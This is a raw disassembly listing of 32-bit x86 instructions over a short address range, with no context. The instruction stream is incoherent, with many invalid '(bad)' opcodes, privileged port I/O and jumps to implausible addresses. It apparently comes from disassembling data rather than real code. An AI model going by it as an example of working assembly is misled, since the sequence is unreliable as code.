  41b2c2:	sar    DWORD PTR [ecx-0x19],0x64
  41b2c6:	pop    es
  41b2c7:	sbb    dh,BYTE PTR [eax+0x5557aad7]
  41b2cd:	sub    eax,0x486fd92b
  41b2d2:	push   ss
  41b2d3:	in     eax,dx
  41b2d4:	int    0xbd
  41b2d6:	xchg   esp,eax
  41b2d7:	xchg   edx,eax
  41b2d8:	jg     0x41b263
  41b2da:	pushf  
  41b2db:	pusha  
  41b2dc:	push   eax
  41b2dd:	(bad)  [edi+0x38946bce]
  41b2e3:	dec    edx
  41b2e4:	in     eax,dx
  41b2e5:	dec    edi
  41b2e7:	outs   dx,DWORD PTR ds:[esi]
  41b2e8:	cli    
  41b2e9:	loopne 0x41b285
  41b2eb:	jl     0x41b28c
  41b2ed:	cmp    DWORD PTR [edx+0x51aaf617],edi
  41b2f3:	cmp    DWORD PTR [edx+esi*4+0x76f552],ebp
  41b2fa:	hlt    
  41b2fb:	pop    edx
  41b2fc:	mov    al,0x45
  41b2fe:	xor    dl,cl
  41b300:	int    0x5b
  41b302:	mov    ah,0x9a
  41b304:	mul    BYTE PTR [ebx+edx*2]
  41b307:	xchg   ebp,eax
  41b308:	cmp    al,BYTE PTR [ecx]
  41b30a:	or     eax,0x98fcb959
  41b30f:	xor    esi,DWORD PTR [ebp+0x50]
  41b312:	lods   al,BYTE PTR ds:[esi]
  41b313:	sbb    DWORD PTR [eax+0x3b],esi
  41b316:	(bad)  
  41b318:	loop   0x41b338
  41b31a:	stc    
  41b31b:	fs pop ds
  41b31d:	jnp    0x41b312
  41b31f:	ds inc edi
  41b321:	push   eax
  41b322:	in     al,dx
  41b323:	call   0xe066:0x511eaa1
  41b32a:	mov    eax,ds:0xd9018ad0
  41b32f:	dec    eax
  41b330:	inc    ebp
  41b331:	xchg   ebx,eax
  41b332:	pop    ss
  41b333:	aaa    
  41b334:	cmp    eax,0x2f861e57
  41b339:	push   ss
  41b33a:	pop    ss
  41b33b:	mov    esi,0x70e15d4b
  41b340:	jg     0x41b358
  41b342:	xor    DWORD PTR [esi-0xaa9dc20],edx
  41b348:	cmp    BYTE PTR [esi-0x4b],ch
  41b34b:	in     al,dx
  41b34c:	ret    0xbf5e
  41b34f:	loope  0x41b2d4
  41b351:	out    dx,al
  41b352:	jae    0x41b365
  41b354:	push   esi
  41b355:	aad    0x36
  41b357:	add    edi,esi
  41b359:	cli    
  41b35a:	jp     0x41b2f2
  41b35c:	bnd ret 0x6da3
  41b360:	into   
  41b361:	mov    ?,WORD PTR [ebp-0x32]
  41b364:	movaps XMMWORD PTR [esi-0x8e2b802],xmm6
  41b36b:	adc    ecx,ebx
  41b36d:	push   edi
  41b36e:	imul   esi,DWORD PTR [esi-0x3cccfbef],0xe3b5cd4c
  41b378:	fnsave [edx-0x33]
  41b37b:	ret    
  41b37c:	jno    0x41b3c0
  41b37e:	mov    ebx,ebp
  41b380:	test   al,0x77
  41b382:	and    DWORD PTR [edx+0x70100764],eax
  41b388:	add    esp,eax
  41b38a:	ret    0x22d4
  41b38d:	aaa    
  41b38e:	xor    DWORD PTR [ecx*4+0xe8cef5e],esp
  41b395:	mov    al,ds:0x73091d63
  41b39a:	test   BYTE PTR [eax],0xe8
  41b39d:	pop    ds
  41b39e:	adc    dl,bh
  41b3a0:	mov    eax,0x23ddf70e
  41b3a5:	add    ah,bl
  41b3a7:	inc    eax
  41b3a8:	mov    edx,0x9c592658
  41b3ad:	jmp    0x211f33fb
  41b3b2:	mov    cl,0x44
  41b3b4:	inc    ebx
  41b3b5:	call   0xa523:0x944bf535
  41b3bc:	xor    ecx,eax
  41b3be:	(bad)  
  41b3bf:	aas    
  41b3c0:	(bad)  
  41b3c2:	hlt    
  41b3c3:	int    0x1
  41b3c5:	ja     0x41b387
  41b3c7:	and    ecx,esp
  41b3c9:	dec    ecx
  41b3ca:	rol    DWORD PTR ds:0x3032501e,1
  41b3d0:	mov    ecx,0x9a476303
  41b3d5:	std    
  41b3d6:	test   eax,0xadfd756d
  41b3db:	pusha  
  41b3dc:	enter  0xa8e0,0x4d
  41b3e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3e1:	cmp    al,0xec
  41b3e3:	loope  0x41b45f
  41b3e5:	shl    bh,cl
  41b3e7:	mov    bl,0xa8
  41b3e9:	and    BYTE PTR [ecx-0x72],al
  41b3ec:	xchg   ebp,eax
  41b3ed:	fsub   DWORD PTR [ebx+0x29eadeb3]
  41b3f3:	or     cl,BYTE PTR [ecx+0xd]
  41b3f6:	pop    edx
  41b3f7:	stc    
  41b3f8:	and    al,0x16
  41b3fa:	mov    DWORD PTR [esi+0x7a5aac95],0x53194856
  41b404:	jb     0x41b40c
  41b406:	push   esi
  41b407:	push   0x1b
  41b409:	pop    edx
  41b40a:	pop    eax
  41b40b:	lods   al,BYTE PTR ds:[esi]
  41b40c:	sbb    al,BYTE PTR [ecx-0x247c4e94]
  41b412:	mov    eax,0x6527bb5d
  41b417:	pusha  
  41b418:	xchg   DWORD PTR [ebp-0x2f65cb29],esp
  41b41e:	leave  
  41b41f:	(bad)  
  41b420:	cmp    dl,BYTE PTR [ecx]
  41b422:	daa    
  41b423:	pop    es
  41b424:	xchg   esp,eax
  41b425:	test   DWORD PTR [ebx-0x3a2d8ef],0xaf69fb63
  41b42f:	test   BYTE PTR [ebx*1-0x247046ca],al
  41b436:	test   ch,0x66
  41b439:	push   DWORD PTR [ebx+eiz*4-0x5c17f0b4]
  41b440:	push   esp
  41b441:	sbb    BYTE PTR [ecx],bl
  41b443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b444:	stc    
  41b445:	or     eax,0x755a7082
  41b44a:	fucompp 
  41b44c:	enter  0x92bf,0x5f
  41b450:	test   BYTE PTR [edx-0x41],cl
  41b453:	data16 (bad) 
  41b455:	sbb    dl,BYTE PTR ds:0x21922ba9
  41b45b:	add    DWORD PTR ds:0x69daa641,0x42
  41b462:	jmp    0x41b48c
  41b464:	shl    DWORD PTR [ebx+eiz*2],cl
  41b467:	icebp  
  41b468:	sub    al,0x2
  41b46a:	inc    esi
  41b46b:	pop    edx
  41b46c:	cwde   
  41b46d:	popf   
  41b46e:	mov    esi,0x3595f75e
  41b473:	mov    ebx,0x5d08cb10
  41b478:	mov    ebp,0x6272692c
  41b47d:	inc    edx
  41b47e:	aaa    
  41b47f:	mov    ecx,0xf2a9d6ee
  41b484:	inc    esi
  41b485:	(bad)  
  41b486:	dec    esp
  41b487:	ins    DWORD PTR es:[edi],dx
  41b488:	clc    
  41b489:	clc    
  41b48a:	gs mov ds,eax
  41b48d:	pop    ss
  41b48e:	pop    esp
  41b48f:	inc    esp
  41b490:	emms   
  41b492:	cmp    BYTE PTR [esi+edx*2-0x50],0xb5
  41b497:	test   BYTE PTR [ecx+edi*4-0x3e0b6e6e],0x8e
  41b49f:	jp     0x41b46e
  41b4a1:	cmc    
  41b4a2:	leave  
  41b4a3:	push   ebp
  41b4a4:	jp     0x41b4d0
  41b4a6:	mov    esp,DWORD PTR [esp+ebp*2-0x60c8c11e]
  41b4ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ae:	addr16 mov ecx,0xccfa3483
  41b4b4:	fild   QWORD PTR ds:0xec66f7d
  41b4ba:	jge    0x41b457
  41b4bc:	dec    edx
  41b4bd:	xchg   DWORD PTR [ecx-0x2c],ecx
  41b4c0:	add    eax,0x5a538092
  41b4c5:	cli    
  41b4c6:	lds    ebp,FWORD PTR [edx-0x6b9bd128]
  41b4cc:	mov    ah,0xe5
  41b4ce:	lds    ebp,FWORD PTR [ecx-0x16]
  41b4d1:	push   cs
  41b4d2:	cld    
  41b4d3:	and    al,0x7e
  41b4d5:	ror    BYTE PTR [ecx-0x74028bb4],cl
  41b4db:	mov    dh,ch
  41b4dd:	out    dx,al
  41b4de:	ins    DWORD PTR es:[edi],dx
  41b4df:	lea    ebp,[ebx]
  41b4e1:	ins    DWORD PTR es:[edi],dx
  41b4e2:	repnz sbb eax,0x6ed3a8ee
  41b4e8:	dec    esp
  41b4e9:	sbb    DWORD PTR [edi+0x7809f911],ebx
  41b4ef:	cs xor BYTE PTR fs:[edi-0x28e6b1c9],bh
  41b4f7:	or     DWORD PTR [ebx+0x75f33253],0xfffffff6
  41b4fe:	cld    
  41b4ff:	aaa    
  41b500:	int3   
  41b501:	dec    BYTE PTR [ebx]
  41b503:	aad    0x39
  41b505:	int3   
  41b506:	mov    dh,0xc3
  41b508:	lahf   
  41b509:	(bad)  
  41b50a:	and    eax,0x374c78bd
  41b50f:	add    DWORD PTR [edx],ecx
  41b511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b512:	das    
  41b513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b514:	or     dh,BYTE PTR [ecx+0x732c67c8]
  41b51a:	in     eax,0xc1
  41b51c:	cmp    ah,al
  41b51e:	mov    edi,0xb4fb2362
  41b523:	inc    ebp
  41b524:	adc    dh,BYTE PTR [eax]
  41b526:	cmp    eax,0x3bceeb7c
  41b52b:	in     eax,0x3a
  41b52d:	adc    al,0x74
  41b52f:	mov    al,ds:0xb86094e9
  41b534:	dec    esi
  41b535:	ss jge 0x41b512
  41b538:	in     eax,dx
  41b539:	jle    0x41b4e6
  41b53b:	(bad)  
  41b53d:	mov    ds:0x5a78114,eax
  41b542:	(bad)  
  41b543:	cld    
  41b544:	pop    esp
  41b545:	loope  0x41b4f2
  41b547:	cdq    
  41b548:	pop    eax
  41b549:	or     al,0x94
  41b54b:	into   
  41b54c:	aaa    
  41b54d:	sbb    DWORD PTR [edx+0x7e41a7b5],ebx
  41b553:	adc    dh,al
  41b555:	setg   BYTE PTR [ebp+ebp*4+0xf1070bb]
  41b55d:	sub    bl,BYTE PTR ds:0x40df0226
  41b563:	jp     0x41b4f7
  41b565:	mov    DWORD PTR [eax],esi
  41b567:	imul   ebp,DWORD PTR [ecx-0x6e],0x6217064a
  41b56e:	or     eax,0xeabcbf9b
  41b573:	and    BYTE PTR [eax-0x4],ah
  41b576:	sbb    DWORD PTR ds:0x3125d7c3,esp
  41b57c:	imul   eax,DWORD PTR [esi+0x302d89f1],0xffffffc9
  41b583:	aas    
  41b584:	out    0x1d,eax
  41b586:	dec    eax
  41b587:	jbe    0x41b531
  41b589:	retf   
  41b58a:	sub    BYTE PTR [ecx+ebp*1],al
  41b58d:	and    ebp,esi
  41b58f:	dec    ecx
  41b590:	jne    0x41b530
  41b592:	xchg   eax,edx
  41b594:	inc    ecx
  41b595:	inc    eax
  41b596:	ss data16 jae 0x41b5ea
  41b59a:	mov    ebx,0xce89c8d7
  41b59f:	ret    0x72e8
  41b5a2:	test   eax,0x4807f79e
  41b5a7:	rol    DWORD PTR [esi+0x28],0x7f
  41b5ab:	mov    ebx,ecx
  41b5ad:	mov    esp,0x367a273f
  41b5b2:	shl    DWORD PTR [ecx+0x7b68c988],cl
  41b5b8:	call   0x2bedb17d
  41b5bd:	sub    eax,0x388c7c95
  41b5c2:	or     ah,BYTE PTR [ecx+0x104fb9cf]
  41b5c8:	lahf   
  41b5c9:	fld    DWORD PTR ds:0x2fb7af4f
  41b5cf:	lods   eax,DWORD PTR ds:[esi]
  41b5d0:	or     al,0xa1
  41b5d2:	shl    BYTE PTR [edi],0x93
  41b5d5:	mov    ?,WORD PTR ds:0x4696f0ef
  41b5db:	pop    esp
  41b5dc:	xor    ecx,DWORD PTR [edx+0xe]
  41b5df:	mov    esp,0xc9d7e149
  41b5e4:	imul   esi,ecx,0xd6bc243d
  41b5ea:	hlt    
  41b5eb:	pusha  
  41b5ec:	mov    eax,0xb4a9f2bd
  41b5f1:	scas   eax,DWORD PTR es:[edi]
  41b5f2:	mov    ebx,0xb6082be3
  41b5f7:	loope  0x41b603
  41b5f9:	fild   QWORD PTR [ecx]
  41b5fb:	dec    eax
  41b5fc:	enter  0xb820,0xbf
  41b600:	ins    DWORD PTR es:[edi],dx
  41b601:	push   esi
  41b602:	dec    ebx
  41b603:	sbb    BYTE PTR [ecx],dh
  41b605:	test   BYTE PTR [ebp+ebp*2-0x4e0d0b1f],ah
  41b60c:	lahf   
  41b60d:	dec    eax
  41b60e:	mov    ?,esp
  41b610:	je     0x41b5ec
  41b612:	add    eax,0x1e4a7de0
  41b617:	mov    dh,0x3b
  41b619:	je     0x41b606
  41b61b:	imul   BYTE PTR ds:0x5c1bef0a
  41b621:	gs mov al,0xe8
  41b624:	scas   eax,DWORD PTR es:[edi]
  41b625:	es cmc 
  41b627:	pop    edi
  41b628:	arpl   WORD PTR [edx+0x58dd7c4a],si
  41b62e:	in     al,0xf8
  41b630:	arpl   WORD PTR [ebp-0xa],bx
  41b633:	ins    BYTE PTR es:[edi],dx
  41b634:	mov    al,ds:0x83c84f16
  41b639:	jle    0x41b6a2
  41b63b:	rol    BYTE PTR [eax],0x33
  41b63e:	xchg   ecx,esi
  41b640:	xchg   esp,eax
  41b641:	cmp    al,0x3c
  41b643:	push   eax
  41b644:	cwde   
  41b645:	xchg   edx,eax
  41b646:	fcmovnb st,st(5)
  41b648:	call   0xfb66a87c
  41b64d:	or     al,0x70
  41b64f:	mov    cl,0x28
  41b651:	jns    0x41b613
  41b653:	lods   eax,DWORD PTR ds:[esi]
  41b654:	cmp    al,0x9e
  41b656:	mov    cl,0x86
  41b658:	dec    eax
  41b659:	add    al,0xf5
  41b65b:	(bad)  
  41b65c:	jo     0x41b693
  41b65e:	dec    esi
  41b65f:	mov    bl,0xbb
  41b661:	add    bh,0xa0
  41b664:	jb     0x41b6e3
  41b666:	mov    ebp,0xd46028e3
  41b66b:	rol    BYTE PTR [esi+0x1119ff17],1
  41b671:	mov    ch,0x6c
  41b673:	jbe    0x41b6b7
  41b675:	or     dh,BYTE PTR [edi+0x22]
  41b678:	and    eax,DWORD PTR [ecx+0x9]
  41b67b:	sub    esi,DWORD PTR [ecx-0x70313c40]
  41b681:	sbb    eax,0xc821e35d
  41b686:	fcomp  QWORD PTR [edi]
  41b688:	and    bl,BYTE PTR [esi+0x19]
  41b68b:	adc    BYTE PTR [ebx],0x27
  41b68e:	ja     0x41b675
  41b690:	mov    dh,BYTE PTR [edx+0xb8716a3]
  41b696:	dec    edi
  41b697:	icebp  
  41b698:	(bad)
  41b69b:	push   edx
  41b69c:	pop    ss
  41b69d:	mov    esp,0xe224b9e
  41b6a2:	add    ebx,DWORD PTR [edi]
  41b6a4:	mov    ebx,DWORD PTR [edx-0x50]
  41b6a7:	rcr    DWORD PTR [esi-0x44],0x60
  41b6ab:	hlt    
  41b6ac:	dec    esp
  41b6ad:	and    esp,DWORD PTR [esi+ebx*4+0x1f]
  41b6b1:	bound  eax,QWORD PTR [eax]
  41b6b3:	aaa    
  41b6b4:	lods   eax,DWORD PTR ds:[esi]
  41b6b5:	adc    bl,BYTE PTR [edi+0x651dc7b4]
  41b6bb:	add    cl,bl
  41b6bd:	(bad)  
  41b6be:	dec    esi
  41b6c0:	inc    edi
  41b6c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6c2:	int    0x74
  41b6c4:	mov    ch,0xda
  41b6c6:	mov    edi,0x50500417
  41b6cb:	cmp    al,0x63
  41b6cd:	inc    edi
  41b6ce:	jae    0x41b704
  41b6d0:	enter  0x88e2,0xc1
  41b6d4:	or     bp,WORD PTR [ebx+0x1e]
  41b6d8:	out    0xd9,eax
  41b6da:	jne    0x41b6cc
  41b6dc:	js     0x41b6f5
  41b6de:	les    eax,FWORD PTR [esi+0x6a]
  41b6e1:	mov    cl,0x19
  41b6e3:	or     ecx,DWORD PTR [eax-0x4cb2c156]
  41b6e9:	xor    al,0x56
  41b6eb:	sbb    dl,bl
  41b6ed:	lds    eax,FWORD PTR [edi-0x65]
  41b6f0:	cmp    esp,DWORD PTR [eax+ebp*4+0x6f01e5b5]
  41b6f7:	les    ecx,FWORD PTR [eax-0x61]
  41b6fa:	push   ebp
  41b6fb:	and    ebp,DWORD PTR [ebx-0x6b]
  41b6fe:	mov    edi,0x93a19645
  41b703:	or     cl,BYTE PTR [eax-0x2105071]
  41b709:	test   eax,0x8cd05793
  41b70e:	pop    eax
  41b70f:	jno    0x41b715
  41b711:	fldcw  WORD PTR ds:0xd35325ee
  41b717:	sbb    al,0xf2
  41b719:	inc    eax
  41b71a:	adc    edi,DWORD PTR [eax]
  41b71c:	gs inc ebx
  41b71e:	inc    edx
  41b71f:	les    ecx,FWORD PTR [ebx-0x11988169]
  41b725:	jns    0x41b717
  41b727:	stos   BYTE PTR es:[edi],al
  41b728:	xchg   edx,eax
  41b729:	mov    dh,0x12
  41b72b:	jb     0x41b717
  41b72d:	aaa    
  41b72e:	push   eax
  41b72f:	daa    
  41b730:	pop    edi
  41b731:	jb     0x41b6b7
  41b733:	pop    es
  41b734:	das    
  41b735:	jge    0x41b6ba
  41b737:	ss popf 
  41b739:	repz sti 
  41b73b:	push   ecx
  41b73c:	out    0x36,al
  41b73e:	sub    BYTE PTR [eax],bl
  41b740:	int3   
  41b741:	pop    eax
  41b742:	dec    edx
  41b743:	(bad)  
  41b744:	adc    DWORD PTR [ecx],edi
  41b746:	pusha  
  41b747:	jmp    0x2c55:0xcfe69504
  41b74e:	stos   BYTE PTR es:[edi],al
  41b74f:	inc    esp
  41b750:	test   al,0xcd
  41b752:	mov    bl,0x57
  41b754:	outs   dx,DWORD PTR ds:[esi]
  41b755:	pop    edi
  41b756:	push   esp
  41b757:	jl     0x41b731
  41b759:	add    ebx,DWORD PTR [esi-0x62740163]
  41b75f:	dec    edi
  41b760:	push   eax
  41b761:	mov    dl,BYTE PTR [ebp-0x38]
  41b764:	arpl   cx,si
  41b766:	push   eax
  41b767:	lahf   
  41b768:	push   cs
  41b769:	push   esi
  41b76a:	js     0x41b738
  41b76c:	scas   al,BYTE PTR es:[edi]
  41b76d:	push   esi
  41b76e:	test   BYTE PTR [edx-0x3b],dh
  41b771:	and    ch,BYTE PTR [ebx+0x439d8410]
  41b777:	popf   
  41b778:	stos   DWORD PTR es:[edi],eax
  41b779:	iret   
  41b77a:	aad    0xc8
  41b77c:	out    dx,eax
  41b77d:	sti    
  41b77e:	jmp    0xa6201c6c
  41b783:	lea    ecx,[edx]
  41b785:	mov    ebx,0x8b4e3bc0
  41b78a:	(bad)  
  41b78c:	xor    BYTE PTR [esi+0x3f828484],dl
  41b792:	faddp  st(4),st
  41b794:	inc    edx
  41b795:	mov    ?,edi
  41b797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b798:	in     eax,dx
  41b799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b79a:	int    0x27
  41b79c:	icebp  
  41b79d:	xor    eax,0x21cb2a34
  41b7a2:	ds stc 
  41b7a4:	jbe    0x41b7d8
  41b7a6:	fild   QWORD PTR [edx-0x3862a8ee]
  41b7ac:	or     esp,DWORD PTR [ecx-0x58]
  41b7af:	ds jle 0x41b780
  41b7b2:	imul   eax,DWORD PTR [esi-0x59],0x47977055
  41b7b9:	retf   
  41b7ba:	add    eax,0xdd79368f
  41b7bf:	pop    es
  41b7c0:	cmp    BYTE PTR [esi+0x4bf112c7],0x1f
  41b7c7:	and    ebp,DWORD PTR [ebx+0x649574e0]
  41b7cd:	cmp    ebp,0x41
  41b7d0:	cli    
  41b7d1:	xor    eax,0x6f6fa24c
  41b7d6:	pushf  
  41b7d7:	test   eax,0xd8f39463
  41b7dc:	cmp    al,bl
  41b7de:	fsubp  st(3),st
  41b7e0:	pop    edi
  41b7e1:	add    dh,BYTE PTR [edi]
  41b7e3:	aaa    
  41b7e4:	inc    edx
  41b7e5:	and    BYTE PTR [esi-0x5d0f7b15],0xe0
  41b7ec:	cmp    BYTE PTR [esi+0x34],ah
  41b7ef:	loopne 0x41b846
  41b7f1:	xchg   DWORD PTR [ecx-0x64],eax
  41b7f4:	add    al,0xdd
  41b7f6:	mov    dh,0x2b
  41b7f8:	ins    DWORD PTR es:[edi],dx
  41b7f9:	jns    0x41b85b
  41b7fb:	push   esp
  41b7fc:	repz xchg ecx,eax
  41b7fe:	les    eax,FWORD PTR [edx-0x6e625b6d]
  41b804:	rcr    bl,0x56
  41b807:	inc    ebx
  41b808:	sahf   
  41b809:	jnp    0x41b800
  41b80b:	push   ss
  41b80c:	das    
  41b80d:	dec    esp
  41b80e:	dec    ecx
  41b80f:	push   0x4a9f31d2
  41b814:	pop    ds
  41b815:	inc    ebx
  41b816:	jno    0x41b7a0
  41b818:	pop    ecx
  41b819:	cs mov ebp,0xb01eaff8
  41b81f:	dec    edi
  41b820:	mov    ebp,esp
  41b822:	dec    ebx
  41b823:	rol    BYTE PTR [edx-0x474ac149],1
  41b829:	neg    eax
  41b82b:	xchg   edi,eax
  41b82c:	push   0xe6a1bbfe
  41b831:	mov    ebx,0x4f557963
  41b836:	lea    ecx,[eax-0x3b2e3675]
  41b83c:	nop
  41b83d:	push   ebp
  41b83e:	jle    0x41b85d
  41b840:	jmp    0xb1dc77e1
  41b845:	into   
  41b846:	cmp    esp,DWORD PTR [ebx-0x6fc7fef2]
  41b84c:	sub    ah,al
  41b84e:	retf   
  41b84f:	icebp  
  41b850:	les    ecx,FWORD PTR [ecx+eiz*1]
  41b853:	push   ds
  41b854:	inc    ebp
  41b855:	fisubr WORD PTR [edi+0x57690d0a]
  41b85b:	jle    0x41b8a6
  41b85d:	sbb    ebx,DWORD PTR [ecx-0x23a0f48b]
  41b863:	cmp    edx,eax
  41b865:	mov    ecx,0x9c99ad4a
  41b86a:	or     BYTE PTR [ebp-0x4c],0x97
  41b86e:	jge    0x41b8a1
  41b870:	or     cl,BYTE PTR [edi+0x2a]
  41b873:	pop    ebp
  41b874:	fiadd  DWORD PTR [edx-0x4a]
  41b877:	xchg   ebx,eax
  41b878:	std    
  41b879:	in     eax,0x30
  41b87b:	int3   
  41b87c:	inc    edi
  41b87d:	jo     0x41b883
  41b87f:	inc    ebx
  41b880:	fucomp st(5)
  41b882:	out    dx,al
  41b883:	out    0xac,al
  41b885:	retf   0x81c2
  41b888:	sub    BYTE PTR [esp+esi*1+0x43],0xcc
  41b88d:	fldcw  WORD PTR [esi]
  41b88f:	test   DWORD PTR [ebx+0x28fa5afe],ebp
  41b895:	out    dx,al
  41b896:	ja     0x41b856
  41b898:	mov    dl,0x7a
  41b89a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b89b:	adc    cl,cl
  41b89d:	fbstp  TBYTE PTR ds:0xfc0f5186
  41b8a3:	mov    ah,0x96
  41b8a5:	xchg   esi,eax
  41b8a6:	mov    dh,0xb1
  41b8a8:	test   al,0x7c
  41b8aa:	inc    edx
  41b8ab:	or     eax,0x75ff7d00
  41b8b0:	bound  eax,QWORD PTR [eax]
  41b8b2:	les    ebx,FWORD PTR [eax+0x25a5706d]
  41b8b8:	push   ds
  41b8b9:	call   0x71f7c6c9
  41b8be:	sti    
  41b8bf:	mov    edi,0x137b9ae
  41b8c4:	mov    al,ds:0x53258448
  41b8c9:	pop    edi
  41b8ca:	int3   
  41b8cb:	push   ss
  41b8cc:	sbb    eax,0xc6771cf0
  41b8d1:	in     eax,0x47
  41b8d3:	out    0xc0,eax
  41b8d5:	jbe    0x41b90c
  41b8d7:	loopne 0x41b868
  41b8d9:	leave  
  41b8da:	ja     0x41b909
  41b8dc:	test   al,0x92
  41b8de:	xchg   eax,ebx
  41b8e0:	repnz xor BYTE PTR [eax+0x71],cl
  41b8e4:	add    dl,ch
  41b8e6:	push   0xef473148
  41b8eb:	mov    dh,0x3
  41b8ed:	sbb    al,cl
  41b8ef:	js     0x5c2f5465
  41b8f5:	out    0xf,eax
  41b8f7:	nop
  41b8f8:	cmp    BYTE PTR [eax+0x23],cl
  41b8fb:	add    eax,0x93d96aed
  41b901:	and    DWORD PTR [ebx-0x11cc606a],eax
  41b907:	ret    
  41b908:	(bad)  
  41b909:	stc    
  41b90a:	xchg   edx,eax
  41b90b:	push   ebx
  41b90c:	test   eax,0x86d53c4
  41b911:	cmp    eax,0x9dc17166
  41b916:	xchg   ecx,eax
  41b917:	xchg   ebp,eax
  41b918:	add    eax,0xf405917b
  41b91d:	xor    ch,BYTE PTR [ebp-0x693539ee]
  41b923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b924:	dec    ecx
  41b925:	out    0x6b,eax
  41b927:	dec    ebx
  41b928:	xlat   BYTE PTR ds:[ebx]
  41b929:	push   0x13
  41b92b:	fs mov edi,0xad4b760d
  41b931:	adc    ecx,DWORD PTR [ecx]
  41b933:	sbb    eax,0x435385d0
  41b938:	mov    eax,0x869aa8e5
  41b93d:	add    al,0x88
  41b93f:	sbb    eax,0x1174313a
  41b944:	lahf   
  41b945:	adc    BYTE PTR ds:0xa0baf137,cl
  41b94b:	cmp    ebp,edx
  41b94d:	out    dx,al
  41b94e:	aas    
  41b94f:	outs   dx,DWORD PTR ds:[esi]
  41b950:	mov    eax,ds:0xcfdddb3f
  41b955:	lds    esp,FWORD PTR [edi]
  41b957:	addr16 sub eax,0xb343e5a4
  41b95d:	rcl    DWORD PTR [esi-0xbad117a],cl
  41b963:	lods   al,BYTE PTR ds:[esi]
  41b964:	call   0xcd2e:0x34bf6740
  41b96b:	adc    DWORD PTR [ebp+edi*4-0x44bef58a],ecx
  41b972:	cmp    dl,BYTE PTR [ebp+0x3608b7cd]
  41b978:	stos   BYTE PTR es:[edi],al
  41b979:	push   edi
  41b97a:	or     esi,eax
  41b97c:	jle    0x41b9c0
  41b97e:	sub    cl,dh
  41b980:	femms  
  41b982:	push   eax
  41b983:	aaa    
  41b984:	pop    eax
  41b985:	clc    
  41b986:	shr    BYTE PTR [ebx-0x54],cl
  41b989:	ss mov ah,bh
  41b98c:	imul   ebp,DWORD PTR [eax],0x97ec99d6
  41b992:	les    ebx,FWORD PTR [edi-0x1c]
  41b995:	bound  ecx,QWORD PTR [edi-0x61eb17fc]
  41b99b:	imul   edi,DWORD PTR [ebp-0x2364db76],0x48
  41b9a2:	push   edx
  41b9a3:	xor    ah,bl
  41b9a5:	sbb    al,0x6f
  41b9a7:	cdq    
  41b9a8:	mov    eax,ds:0x29159709
  41b9ad:	pop    ecx
  41b9ae:	cmp    DWORD PTR [eax+0x50],ecx
  41b9b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9b2:	aam    0x6e
  41b9b4:	pop    esi
  41b9b5:	sbb    ebp,DWORD PTR [eax+0x52]
  41b9b8:	xor    dh,BYTE PTR [ebp-0x25220429]
  41b9be:	shr    al,1
  41b9c0:	and    esi,DWORD PTR [edx+0x4a]
  41b9c3:	dec    edi
  41b9c4:	and    edx,edi
  41b9c6:	mov    al,ds:0x979782ce
  41b9cb:	ret    
  41b9cc:	clc    
  41b9cd:	sbb    al,0x5a
  41b9cf:	lds    eax,FWORD PTR [ebx+esi*2]
  41b9d2:	sti    
  41b9d3:	stc    
  41b9d4:	aad    0xb3
  41b9d6:	xchg   ah,cl
  41b9d8:	hlt    
  41b9d9:	inc    esi
  41b9da:	addr16 jbe 0x41b989
  41b9dd:	xor    eax,0x88566e27
  41b9e2:	fcmovu st,st(0)
  41b9e4:	dec    ebp
  41b9e5:	cmc    
  41b9e6:	cmp    dh,al
  41b9e8:	pusha  
  41b9e9:	fdivr  QWORD PTR [ebx+0x44d0e2ec]
  41b9ef:	ins    BYTE PTR es:[edi],dx
  41b9f0:	sbb    DWORD PTR [eax-0x4f],0x1ffaa1a
  41b9f7:	mov    bh,0x0
  41b9f9:	sbb    DWORD PTR [eax],ebp
  41b9fb:	add    al,0xd0
  41b9fd:	dec    ecx
  41b9fe:	or     bl,BYTE PTR [ebx-0x14]
  41ba01:	push   0xb9c9c0f3
  41ba06:	stc    
  41ba07:	push   edi
  41ba08:	mov    bl,0x45
  41ba0a:	sbb    al,0xcd
  41ba0c:	cmp    eax,0x2a21a4b5
  41ba11:	adc    bh,BYTE PTR [ecx]
  41ba13:	or     dl,dh
  41ba15:	sar    BYTE PTR [eax+0x50bd065a],cl
  41ba1b:	pop    ds
  41ba1c:	mov    ecx,0xf91b6963
  41ba21:	jnp    0x41ba24
  41ba23:	xchg   edi,eax
  41ba24:	ret    0x88ac
  41ba27:	xchg   edi,eax
  41ba28:	inc    eax
  41ba29:	iret   
  41ba2a:	cmp    al,0xa2
  41ba2c:	and    ch,bh
  41ba2e:	in     eax,dx
  41ba2f:	fidiv  WORD PTR [edx-0x50a594c]
  41ba35:	jl     0x41ba24
  41ba37:	add    al,0x46
  41ba39:	add    eax,0x9751c081
  41ba3e:	dec    edx
  41ba3f:	in     eax,dx
  41ba40:	mov    es,WORD PTR [esi-0x737ece81]
  41ba46:	pop    esp
  41ba47:	mov    ?,WORD PTR [ecx+0x1]
  41ba4a:	or     cl,BYTE PTR [edx+0x49]
  41ba4d:	(bad)  
  41ba4e:	aad    0xee
  41ba50:	pop    ebp
  41ba51:	test   al,0x64
  41ba53:	cli    
  41ba54:	add    al,0x86
  41ba56:	pop    DWORD PTR [edx]
  41ba58:	jns    0x41ba77
  41ba5a:	mov    edx,0x2a3a816a
  41ba5f:	sbb    eax,edi
  41ba61:	call   0xb1084d9e
  41ba66:	mov    esp,0xdfe1289c
  41ba6b:	mov    WORD PTR [ecx+0x2ce51eaa],ss
  41ba71:	jo     0x41babf
  41ba73:	dec    ebx
  41ba74:	inc    ebp
  41ba75:	imul   esi,ebp,0x8e55dfdf
  41ba7b:	push   ebp
  41ba7c:	in     eax,dx
  41ba7d:	jb     0x41ba4a
  41ba7f:	or     al,0x1a
  41ba81:	jns    0x41ba50
  41ba83:	mov    dh,0xbe
  41ba85:	adc    edx,DWORD PTR [eax-0x49]
  41ba88:	cmp    al,0x58
  41ba8a:	inc    ebp
